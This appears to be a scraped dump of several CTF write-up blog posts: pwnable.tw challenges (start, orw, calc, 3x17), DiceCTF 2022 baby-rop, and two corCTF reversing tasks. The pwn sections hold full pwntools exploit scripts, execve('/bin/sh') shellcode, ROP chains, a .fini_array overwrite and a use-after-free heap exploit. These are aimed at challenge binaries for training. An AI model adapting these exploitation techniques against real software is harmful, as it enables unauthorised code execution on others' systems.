asm(\u0026#39;\u0026#39;.join([\r\u0026#39;mov al, 0xb\\n\u0026#39;,\r\u0026#39;mov ebx, esp\\n\u0026#39;,\r\u0026#39;xor ecx, ecx\\n\u0026#39;, \u0026#39;xor edx, edx\\n\u0026#39;,\r\u0026#39;int 0x80\\n\u0026#39; ]), os=\u0026#39;linux\u0026#39;, bits=32)\rpayload2 = payload2.ljust(20, b\u0026#39;\\x00\u0026#39;)\rpayload2 += p32(stack_leak-4)\rpayload2 += b\u0026#39;/bin/sh\\x00\u0026#39; set breakpoint and si till here, we can see that after ret it will jump to our shellcode\nSo that\u0026rsquo;s all and we get the shell. Full code here\nSolve script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from pwn import * import subprocess context.binary = ELF(\u0026#34;./start\u0026#34;, checksec=False) # break at ret before the program end for debug def GDB(command=\u0026#39;\u0026#39;): command = \u0026#39;\u0026#39;\u0026#39; b*0x0804809c c \u0026#39;\u0026#39;\u0026#39; input() # input() to make program wait with gdb # p = process(\u0026#39;./start\u0026#39;) p = connect(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) payload = b\u0026#39;A\u0026#39;*20 payload += flat(0x08048086) p.recvuntil(b\u0026#39;tart the CTF:\u0026#39;) p.send(payload) stack_leak = u32(p.recv(4)) payload2 = asm(\u0026#39;\u0026#39;.join([ \u0026#39;mov al, 0xb\\n\u0026#39;, \u0026#39;mov ebx, esp\\n\u0026#39;, \u0026#39;xor ecx, ecx\\n\u0026#39;, \u0026#39;xor edx, edx\\n\u0026#39;, \u0026#39;int 0x80\\n\u0026#39; ]), os=\u0026#39;linux\u0026#39;, bits=32) payload2 = payload2.ljust(20, b\u0026#39;\\x00\u0026#39;) payload2 += p32(stack_leak-4) payload2 += b\u0026#39;/bin/sh\\x00\u0026#39; p.send(payload2) p.interactive() orw - 100pts Craft shellcode Writing shellcode, we will use 3 syscall are open ,read , and write to open, read, and write flag that store on buffer to screen.\nThe path to flag is /home/orw/flag.\n1 2 3 4 #!/bin/sh nasm -f elf32 -o r.o r.asm ld -m elf_i386 -s -o r r.o Push the string /home/orw/flag on stack\n1 2 3 4 u32(\u0026#39;/hom\u0026#39;) -\u0026gt; 1836017711 u32(\u0026#39;e/or\u0026#39;) -\u0026gt; 1919889253 u32(\u0026#39;w/fl\u0026#39;) -\u0026gt; 1818636151 u32(\u0026#39;ag\\x00\\x00\u0026#39;) -\u0026gt; 26465 the stack is FILO so we have to reverse the order:\nsection .text\rglobal _start\r_start:\rpush 26465\rpush 1818636151\rpush 1919889253\rpush 1836017711 Use compile.sh to compile and attach to gdb, we can see the string is correct:\nLookup for the syscall number and the registers for per syscall here. So we want to do a open syscall, check all the registers now:\nmov eax, 5\rmov ebx, esp\rmov ecx, 0\rmov edx, 0\rint 0x80 Let\u0026rsquo;s read the flag with the fd we got (size buffer 0x100):\nmov ebx, eax\rmov eax, 3\rmov ecx, esp\rmov edx, 0x100\rint 0x80 Print it out with syscall 0x80:\nmov eax, 4\rmov ebx, 1\rint 0x80 All together.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * exe = context.binary = ELF(\u0026#39;./orw\u0026#39;, checksec=False) # p = process(exe.path) p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10001) payload = asm( \u0026#39;\u0026#39;\u0026#39; push 26465 push 1818636151 push 1919889253 push 1836017711 mov eax, 5 mov ebx, esp mov ecx, 0 mov edx, 0 int 0x80 mov ebx, eax mov eax, 3 mov ecx, esp mov edx, 0x100 int 0x80 mov eax, 4 mov ebx, 1 int 0x80 \u0026#39;\u0026#39;\u0026#39;, os=\u0026#39;linux\u0026#39;, arch=\u0026#39;i386\u0026#39; ) p.sendafter(b\u0026#39;shellcode:\u0026#39;, payload) print(p.recvall()) p.interactive() calc - 150pts In calc, it uses parse_expr to allocating memory for numbers and evaluating them. There\u0026rsquo;s a bug in how it handles operators and numbers, allowing us to manipulate the pool.\nIf we start with +100, the pool will be point to the stack at pool[100]. If we try +100+200, we will able to modify the stack.\nCalculate the offset between pool and the saved EIP of main. We\u0026rsquo;ll use this to execute a payload that calls execve with /bin/sh.\nCraft payload Use ropchain to find some gadgets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ROPgadget --binary calc \u0026gt; gadget $ cat gadget | grep \u0026#34;: pop\u0026#34; 0x0805c34b : pop eax ; ret ... 0x080701d1 : pop ecx ; pop ebx ; ret ... 0x080701aa : pop edx ; ret ... $ cat gadget | grep \u0026#34;int 0x80\u0026#34; ... 0x0807087e : nop ; nop ; int 0x80 # This gadget has ret ... Choose a writable address, like 0x80eba00. The offset between pool and the saved EIP is 0x170.\nWe have eip is ebp + 4, which is 0xffffcfec. And the stack :\nSo the pool is at the address of 0xffffca28.\nWe found the offset is 0x171.\nThe highlighted address is address of pool. The address above pool is our expression. Let\u0026rsquo;s check that:\ngef➤ # x/2xw \u0026lt;saved ebp of main\u0026gt;\rgef➤ x/2xw 0xffc2dc88\r0xffc2dc88:\t0x08049c30\t0x0804967a\rgef➤ x/2xw 0xffc2d6c8 + 369*4 + 4\r0xffc2dc90:\t0x00000001\t0xffc2dd14 We can see that saved eip of main is at 0xffc2dc88 + 4 = 0xffc2dc8c but pool[0x171] points after saved eip. The correct offset now change to 0x170.\nInput payload Now, we just simply input it from bottom to up with the index plus 0x170, that\u0026rsquo;s the distance between pool and saved eip of main:\n1 2 3 for i in range(len(payload_list)-1, -1, -1): payload = f\u0026#39;+{0x170+i}+{payload_list[i]}\u0026#39;.encode() p.sendline(payload) Debig by attach with gdb to check if it is correct or not:\nWe can\u0026rsquo;t use 0 in our expressions, so we have to get creative to make a 4-byte null. We do this by using subtraction. For example, if you input +368+512, pool[368] gets 512, and pool[367] becomes 512 too. To reset pool[367] to null, just input +368-512. Now pool[368] is 512, and pool[367] is null.\nThe pool uses int, so we need to handle integer overflow to get null. Let\u0026rsquo;s say pool[367] starts with 0xdeadbeef. After +368+512, it becomes 0xdeadc0ef. The program prints -559038225, which is 0xdeadc0ef. We use Python\u0026rsquo;s struct to convert -559038225 back to 0xdeadc0ef and calculate how much to add to reach 0x100000000. The difference is 0x21523f11, or 559038225 as an int.\nIn our case, we subtract both the printed number and the number we want to add. For example, if the printed number is 0xdeadc0ef and we want to add 0x08040201, we calculate 0x100000000 - 0xdeadc0ef - 0x08040201 = 0x194e3d10, which is 424557840 as an int.\nSo put in function for easier to convert and get the number:\n1 2 3 4 5 6 7 8 def getnum(num, need): if num\u0026lt;0: num = u32(struct.pack(\u0026#39;\u0026lt;i\u0026#39;, num)) num = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;, p32((0x100000000 - num - need)))[0] num = str(num) if \u0026#39;-\u0026#39; not in num: num = \u0026#39;+\u0026#39; + num return num And the code will be updated to this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 for i in range(len(payload_list)-1, -1, -1): # We don\u0026#39;t want program print out anything unrelated to number if payload_list[i]==0: continue # If we have 4-byte null before current inputing number if payload_list[i-1]==0: payload = f\u0026#39;+{eip+i}+{payload_list[i]}\u0026#39;.encode() p.sendline(payload) recv = int(p.recvline()[:-1]) print(recv, payload_list[i]) # If number is equal, just simply subtract if recv==payload_list[i]: payload = f\u0026#39;+{eip+i}-{payload_list[i]}\u0026#39;.encode() p.sendline(payload) p.recvline() # If number is not equal, means something added # Make previous number to opposite of number want to add of current number else: t = getnum(recv, payload_list[i]) payload = f\u0026#39;+{eip+i}{t}\u0026#39;.encode() p.sendline(payload) p.recvline() payload = f\u0026#39;+{eip+i}+{payload_list[i]}\u0026#39;.encode() p.sendline(payload) p.recvline() else: payload = f\u0026#39;+{eip+i}+{payload_list[i]}\u0026#39;.encode() p.sendline(payload) p.recvline() We get the null byte in our payload. Let\u0026rsquo;s make it run to ret of main by input \\n and check if we can input with syscall read or not. And of course, it wait for our input and I inputted AAAAAAAABBBBBBBB:\nLet\u0026rsquo;s ni and check for all of our payload to see if all the register is correct for a syscall of execve or not:\n3x17 - 150pts 1. Recon 1 2 3 4 5 6 7 8 9 $ file 3x17 ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped $ checksec 3x17 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) There\u0026rsquo;s a function called entry that works like __libc_start_main and calls the function at 0x401b6d, which we\u0026rsquo;ll rename to main.\nBy running the program, we found that FUN_00446ec0 is like write, and FUN_00446e20 is like read. Another function in main is FUN_0040ee70, which processes an address, so we\u0026rsquo;ll rename it to parse_addr.\nReading parse_addr is tricky, so let\u0026rsquo;s use gdb-gef to debug it. We\u0026rsquo;ll set a breakpoint after parse_addr and try different inputs to see what happens:\ngef➤ x/30i 0x401b6d # main\r...\r0x401be8: mov eax,0x0\r0x401bed: call 0x40ee70\r0x401bf2: cdqe 0x401bf4: mov QWORD PTR [rbp-0x28],rax\rgef➤ b*0x401bf2\rBreakpoint 1 at 0x401bf2 We\u0026rsquo;re testing the parse_addr function by running the program and trying different inputs like numbers and letters. We use gdb-gef to see what parse_addr does.\nCheck out the images to see the results. Notice how rax shows 0x4d2, which is 1234 in decimal, matching our input. This means parse_addr works like atol, converting input to a number.\nAfter converting, it reads user input to that address and exits. So, we can modify any writable address.\n2. Idea We can change three addresses at once, so let\u0026rsquo;s focus on the function called after main returns, which acts like exit. Without libc, we can\u0026rsquo;t use one gadget, and running main again just exits the program. I found a technique online to change the .fini_array, which is writable.\nThe exit function calls __libc_csu_fini, which runs two functions in .fini_array in reverse order. By changing these to main and __libc_csu_fini, we create a loop that keeps calling main. This loop resets a global variable, letting us bypass checks.\nWe can find __libc_csu_fini by checking the entry point. With this loop, we can build a ROP chain to get a shell.\nSummary:\nStage 1: Overwrite .fini_array Stage 2: Get shell with ROP chain 3. Exploit Stage 1: Overwrite .fini_array Stage 1: Overwrite .fini_array First, change foo_destructor to main so __libc_csu_fini calls main again. Change _do_global_dtors_aux to __libc_csu_fini to keep the loop going. We know __libc_csu_fini is at 0x402960, .fini_array is at 0x4b40f0, and main is at 0x401b6d. Let\u0026rsquo;s script the overwrite of .fini_array.\nAnd with the images above, we know the address of main is 0x401b6d. We know where to write and what to write, let\u0026rsquo;s make a script to overwrite .fini_array:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * exe = context.binary = ELF(\u0026#39;./3x17\u0026#39;, checksec=False) context.log_level = \u0026#39;debug\u0026#39; p = process(exe.path) # p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10105) fini_array = 0x4b40f0 libc_csu_fini = 0x0402960 main = 0x401b6d payload = flat(libc_csu_fini, main) p.sendafter(b\u0026#39;addr:\u0026#39;, f\u0026#39;{fini_array}\u0026#39;.encode()) p.sendafter(b\u0026#39;data:\u0026#39;, payload) p.interactive() Stage 2: Get shell with ROPchain Our payload will get input from user so that we can input string /bin/sh and then, execute syscall execve with inputted string to get the shell. Gadgets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ROPgadget --binary 3x17 \u0026gt; gadget $ cat gadget | grep ret | grep \u0026#34;: pop \u0026#34; 0x000000000041e4af : pop rax ; ret ... 0x0000000000401696 : pop rdi ; ret ... 0x0000000000446e35 : pop rdx ; ret ... 0x0000000000406c30 : pop rsi ; ret ... $ cat gadget | grep \u0026#34;: syscall\u0026#34; 0x00000000004022b4 : syscall So let\u0026rsquo;s take 0x000000004b4a00 as a buff, payload now :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 pop_rax = 0x000000000041e4af pop_rdi = 0x0000000000401696 pop_rdx = 0x0000000000446e35 pop_rsi = 0x0000000000406c30 syscall = 0x00000000004022b4 rw_section = 0x000000004b4a00 read_addr = 0x446e20 payload = flat( pop_rdi, 0, pop_rsi, rw_section, pop_rdx, 8, read_addr, pop_rax, 0x3b, pop_rdi, rw_section, pop_rsi, 0, pop_rdx, 0, syscall ) Remember to set context.binary before using flat(). The address read_addr is the function read we\u0026rsquo;ve renamed above.\nNow, we will need to write our payload to somewhere so that program can execute. The idea is to do a stack pivot because we can see when it jumps to __libc_csu_fini, it will put a address which is writable to the rbp:\nSo if we can make the program execute leave ; ret, the stack will be 0x000000004b40f8 and it will return to the address on that stack. But 0x4b40f8 is the address of .fini_array+8 so we will want to write our payload after .fini_array (which means we will write our payload at .fini_array+0x10). So the code will be as follows:\n1 2 3 for i in range(0, len(payload), 0x18): p.sendafter(b\u0026#39;addr:\u0026#39;, f\u0026#39;{fini_array+0x10+i}\u0026#39;.encode()) p.sendafter(b\u0026#39;data:\u0026#39;, payload[i:i+0x18]) Let\u0026rsquo;s attach with gdb to check if our payload is inputted correctly or not:\nWe can see that our payload is inputted correctly.\nAfter we inputted payload, the program will jump back to main and run until the check in main is satisfy, which means it will run until it read from user input. Remember that .fini_array after we overwrited look likes:\n__libc_csu_fini main So after the next input (main), it will jump to __libc_csu_fini. We first will want to change __libc_csu_fini to gadget leave ; ret so that we can pivot the stack.\nAfter leave instruction, the program will return back to main (we didn\u0026rsquo;t change that, just have change __libc_csu_fini) so we will want to change main into a ret instruction. Overall, we will want to change the .fini_array to\nleave ; ret ret Let\u0026rsquo;s find those 2 gadget or just find the gadget leave ; ret and then add 1 because leave takes 1 byte:\n1 2 $ cat gadget | grep \u0026#34;: leave ; ret\u0026#34; 0x0000000000401c4b : leave ; ret And let\u0026rsquo;s overwrite .fini_array:\n1 2 3 4 leave_ret = 0x0000000000401c4b ret = leave_ret + 1 p.sendafter(b\u0026#39;addr:\u0026#39;, f\u0026#39;{fini_array}\u0026#39;.encode()) p.sendafter(b\u0026#39;data:\u0026#39;, flat(leave_ret, ret)) Let\u0026rsquo;s run and attach with gdb to know if it can run our ROPchain. Stop at the call to a function inside .fini_array in __libc_csu_fini and check the .fini_array:\nAha! We can see the leave ; ret gadget. Let\u0026rsquo;s type si to see the stack change:\nAnd the program execute ret again to jump into our payload. Well, let\u0026rsquo;s make it send the string /bin/sh\\x00 and we can get the shell:\n1 2 input(\u0026#34;Press ENTER to continue...\u0026#34;) p.send(b\u0026#39;/bin/sh\\x00\u0026#39;) Why I added input()? Because with the last input into main, we just write 0x10 bytes, 8 bytes left, so if we send it continuously without hesitation, our string /bin/sh\\x00 may input to that 8 bytes left and the payload is corrupted.\n4. Get flag The flag is at /home/3x17.\n","description":"Trainnig Pwn","id":12,"section":"posts","tags":["pwn","bof","heap","rop"],"title":"Pwnable.tw Writeups","uri":"https://duythucne22.github.io/posts/pwnable.tw/"},{"content":"ctf.dicega.ng - baby-rop Challenge link: https://ctf.dicega.ng/challs\nYou can also download challenge file from my repo: baby-rop.zip\nThere will be 5 files in zip:\nbabyrop ld-linux-x86-64.so.2 libc.so.6 seccomp-bpf.h uaf.c You can use patchelf or attached file \u0026ldquo;patch.sh\u0026rdquo; to patch file.\nDisclamer: This repo for studying purpose only. Origin writeup here.\nAnd when everything\u0026rsquo;s ready, let\u0026rsquo;s start!\n1. Find bug First, we will use file to check information of challenge:\nbabyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=22e8dcbaa41a9ddd0d137d3f83de9d9eee392236, not stripped This is a 64-bit file without being stripped. That\u0026rsquo;s sound great when we need to debug. Next, we will use checksec to check for security of challenge:\nArch: amd64-64-little\rRELRO: Full RELRO\rStack: No canary found\rNX: NX enabled\rPIE: No PIE (0x3fe000) We can see that with Full RELRO, we cannot overwrite any GOT (maybe not necessary), and NX enabled, a non-execute stack. Finally, let\u0026rsquo;s open given source code uaf.c for futher analysis. We can see at the begining of source, there is a seccomp filter:\nstruct sock_filter filter[] = {\rVALIDATE_ARCHITECTURE,\rEXAMINE_SYSCALL,\rALLOW_SYSCALL(mprotect),\rALLOW_SYSCALL(mmap),\rALLOW_SYSCALL(munmap),\rALLOW_SYSCALL(exit_group),\rALLOW_SYSCALL(read),\rALLOW_SYSCALL(write),\rALLOW_SYSCALL(open),\rALLOW_SYSCALL(close),\rALLOW_SYSCALL(openat),\rALLOW_SYSCALL(fstat),\rALLOW_SYSCALL(brk),\rALLOW_SYSCALL(newfstatat),\rALLOW_SYSCALL(ioctl),\rALLOW_SYSCALL(lseek),\rKILL_PROCESS,\r}; The filter restricts the number of syscall we can use. But with syscall open, read and write is enough for reading flag. The next part of source code we notice is:\nvoid free_safe_string(int i) {\rsafe_string * ptr = data_storage[i];\rfree(ptr-\u0026gt;string);\rfree(ptr);\r} Freeing without removing pointer will result to Use After Free. That\u0026rsquo;s all interesting things we can get from static analysis. Now let\u0026rsquo;s brainstorming!\n2. Brainstorming As origin writeup above said:\nIn many of these type of CTF challenges you usually end up creating 10 or so allocations, freeing them, then creating a larger one that can write to previously allocated memory with pointers we want to control that have existing pointers pointing to them.\nSo we just try to create all 10 chunk and free them, then create a larger chunk to see what happen:\ngef➤ x/10xg \u0026amp;data_storage\r0x404040 \u0026lt;data_storage\u0026gt;:\t0x0000000000774960\t0x0000000000774730\r0x404050 \u0026lt;data_storage+16\u0026gt;:\t0x00000000007747a0\t0x0000000000774810\r0x404060 \u0026lt;data_storage+32\u0026gt;:\t0x0000000000774880\t0x00000000007748f0\r0x404070 \u0026lt;data_storage+48\u0026gt;:\t0x0000000000774960\t0x00000000007749d0\r0x404080 \u0026lt;data_storage+64\u0026gt;:\t0x0000000000774a40\t0x0000000000774ab0\rgef➤ x/2xg 0x0000000000774960\t# Check data_storage[0]\r0x774960:\t0x0000000000000420\t0x00000000007749d0\rgef➤ x/s0x00000000007749d0\t# Check data_storage[7]\r0x7749d0:\t\u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaak\u0026#34; We can see that string of index 0 (data_storage[0][1]) will write to struct of index 7 (data_storage[7]). That\u0026rsquo;s cool! With that, we can write out a size of 6 with put@got as the address to struct index 7, then read it from the program menu to leak libc.\nWith that in hand, do it again, but this time with libc.sym['environ'] to get a stack leak. From there we can compute the distance in GDB from the environment to the saved rip on the stack. And with that location known, well we just write out a ROP chain.\nSummary:\nLeak address Create ROP chain and get flag 3. Exploit def create(index, length, data):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;C\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rp.sendlineafter(b\u0026#39;How long is your safe_string:\u0026#39;, \u0026#39;{}\u0026#39;.format(length).encode())\rp.sendafter(b\u0026#39;enter your string:\u0026#39;, data)\rdef free(index):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;F\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rdef read(index):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;R\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rreturn p.recvuntil(b\u0026#39;enter\u0026#39;)\rdef write(index, data):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;W\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rp.sendafter(b\u0026#39;enter your string:\u0026#39;, data) These function for handy use.\nStep 1: Leak address We just create and free 10 chunk, then create a larger chunk and we can control a chunk struct:\nfor i in range(10):\rcreate(i, 0x40, \u0026#39;{}\u0026#39;.format(i).encode()*8)\rfor i in range(10):\rfree(i)\rcreate(0, 0x420, cyclic(0x420)) Next, we will write address of puts@got and then write it out:\nwrite(0, flat(0x8, exe.got[\u0026#39;puts\u0026#39;]))\rprint(read(7)) After getting puts address, we calculate libc base and libc.sym['environ'] to leak environment stack address, then we get saved rip of main by calculating the distance from the environment address to the return address on the stack.\nHowever the offset may not the same for local and remote systems. If not exact, it is usually close, so just test +/- 8, 16, etc\u0026hellip; until you found it.\nStep 2: Create ROP chain and get flag At first, I used syscall but then I recognize after syscall, there is no ret so I change to use open, read and write from libc. So that, we will need these gadget for our rop:\npop_rdx_ret = libc.address + 0x00000000000d9c2d\rpop_rdi_ret = libc.address + 0x000000000002d7dd\rpop_rsi_ret = libc.address + 0x000000000002eef9\rxchg_eax_edi_ret = libc.address + 0x000000000014683c After a open, we have file descryptor in rax but there is no mov so we will use xchg instead. Our ROP chain will be like this:\nstr_flag = return_addr + 0x70\rstr_flag_context = str_flag + 0x8\rrop = flat(pop_rdi_ret, str_flag, pop_rsi_ret, 0, libc.sym[\u0026#39;open\u0026#39;])\rrop += flat(xchg_eax_edi_ret, pop_rsi_ret, str_flag_context, pop_rdx_ret, 0x200, libc.sym[\u0026#39;read\u0026#39;])\rrop += flat(pop_rdi_ret, 1, libc.sym[\u0026#39;write\u0026#39;])\rrop += flat(b\u0026#39;flag.txt\\x00\u0026#39;)\rwrite(0, flat(len(rop), return_addr))\rwrite(7, rop) 0x70 is the offset from rip to string flag.txt. If everything goes well, when we exit, we can get the flag.\np.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;E\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, b\u0026#39;0\u0026#39;) Full code: solve.py\n4. Get flag Flag is dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}\n","description":"Practice write up mark down file","id":13,"section":"posts","tags":["ctf","pwn","ROP"],"title":"DiceCTF 2022 Writeups","uri":"https://duythucne22.github.io/posts/2022/dicectf2022/"},{"content":"Microsoft Linux Description:\nMicrosoft\u0026rsquo;s latest addition to the world of Open Source: a flag checker\u0026hellip;\nAttachment file:\nm\u0026lt;3l.exe\nOpen file with DiE:\nelf file but end with .exe. run in linux env\nlib elf.dll usage\ninital code view\nTake our input and store in byte_100111 loop 18 times, take each char from our input then rol 0xd and compare with byte_100210.\nAfter check return Incorect :( or $Well done! Sadly, Microsoft has embraced, extended and extinguished the other half of the flag :(\u0026hellip;\ntake consider (flag_encrypted)\ni saw it as 36 bytes instead 18\nUse get_bytes(0x100210,36) in IdaPython:\nWith the the first 18 bytes we can easily reverse the flow\n1 2 3 4 5 6 7 from pwn import ror data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; flag = \u0026#34;\u0026#34; for i in data: flag+=chr(ror(i,13,8)) print(flag) what it look like\nit only half of the flag\nDouble check in IDA for the missing half\nuse \u0026lsquo;c\u0026rsquo; to concat to code\nsimilar above, instead of using rol it used pushf and,.. Might becuase of my ida version or some how it didn\u0026rsquo;t show up.\nby this point, i\u0026rsquo;m thinking of brute forcing \u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p. however it seem like a simple xor with 0xd.\n1 2 3 4 5 6 7 8 9 10 from pwn import * data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; flag = \u0026#34;\u0026#34; for i in data[:18]: flag+=chr(ror(i,13,8)) print(flag) last = b\u0026#39;\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; print(flag + str(xor(last,0xd))) Together we have this flag:\nFlag: corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}\nturbocrab Description:\n🚀🚀 blazinglyer faster 🚀🚀\nSHA256 hash of the flag: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nAttachment file:\nturbocrab\nNormal ELF, unpack and check flag.\nStatic anslysis with IDA\nSince program written in rust which i have non-experience in it, so i gonna use tabstring(look for text \u0026ldquo;Flag is incorrect!\u0026rdquo;) reference to it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 void __cdecl turbocrab::execute_shellcode::h6984ce5848b31780(__u8_ shellcode) { __u8_ v1; // rdi __int64 v2; // r15 __int64 v3; // rdx usize v4; // [rsp+8h] [rbp-190h] u8 *v5; // [rsp+10h] [rbp-188h] usize len; // [rsp+20h] [rbp-178h] __int64 count; // [rsp+28h] [rbp-170h] core::ffi::c_void *src; // [rsp+30h] [rbp-168h] core::ffi::c_void *dst; // [rsp+48h] [rbp-150h] _BYTE v10[29]; // [rsp+63h] [rbp-135h] BYREF alloc::vec::Vec\u0026lt;u8,alloc::alloc::Global\u0026gt; self; // [rsp+80h] [rbp-118h] BYREF u8 *v12; // [rsp+98h] [rbp-100h] __int64 v13; // [rsp+A0h] [rbp-F8h] BYREF core::fmt::Arguments v14; // [rsp+A8h] [rbp-F0h] BYREF core::fmt::Arguments v15; // [rsp+D8h] [rbp-C0h] BYREF __u8_ v16; // [rsp+108h] [rbp-90h] core::ffi::c_void *v17; // [rsp+118h] [rbp-80h] __int64 *v18; // [rsp+130h] [rbp-68h] __int64 v19; // [rsp+138h] [rbp-60h] __int64 v20; // [rsp+140h] [rbp-58h] __int64 v21; // [rsp+148h] [rbp-50h] core::ffi::c_void *v22; // [rsp+150h] [rbp-48h] core::ffi::c_void *v23; // [rsp+158h] [rbp-40h] __int64 v24; // [rsp+160h] [rbp-38h] __int64 v25; // [rsp+168h] [rbp-30h] u8 *v26; // [rsp+170h] [rbp-28h] __int64 v27; // [rsp+178h] [rbp-20h] u8 *v28; // [rsp+180h] [rbp-18h] v16 = shellcode; v25 = 0LL; dst = (core::ffi::c_void *)mmap(0LL, shellcode.length, 3, 33, -1, 0LL); v17 = dst; qmemcpy(v10, \u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34;, sizeof(v10)); alloc::vec::from_elem::hba0d51ad3cb1207d(\u0026amp;self, 0, 0x4000uLL); v26 = alloc::vec::Vec$LT$T$C$A$GT$::as_ptr::h0252951c7d91d004(\u0026amp;self); v27 = 49602LL; v28 = v26 + 49602; v12 = v26 + 49602; src = (core::ffi::c_void *)core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(shellcode); count = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); v22 = dst; v23 = src; v24 = count; core::intrinsics::copy::h46e3e522e297e890(src, dst, count); len = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); mprotect(dst, len, 5); v13 = v20; v18 = \u0026amp;v13; v1.data_ptr = v10; v1.length = 29LL; v5 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(v1); v1.data_ptr = v10; v1.length = 29LL; v4 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(v1); v2 = (__int64)v12; v13 = ((__int64 (__fastcall *)(_BYTE *, __int64, __int64, core::ffi::c_void *, u8 *, usize))dst)( v10, 29LL, v3, dst, v5, v4); v12 = (u8 *)v2; v19 = v13; v21 = v13; if ( v13 == 1 ) core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c( \u0026amp;v14, (___str_)__PAIR128__(1LL, \u0026amp;stru_174F78), (__core::fmt::ArgumentV1_)(unsigned __int64)\u0026amp;stru_10B240); else core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c( \u0026amp;v15, (___str_)__PAIR128__(1LL, \u0026amp;stru_174F68), (__core::fmt::ArgumentV1_)(unsigned __int64)\u0026amp;stru_10B240); 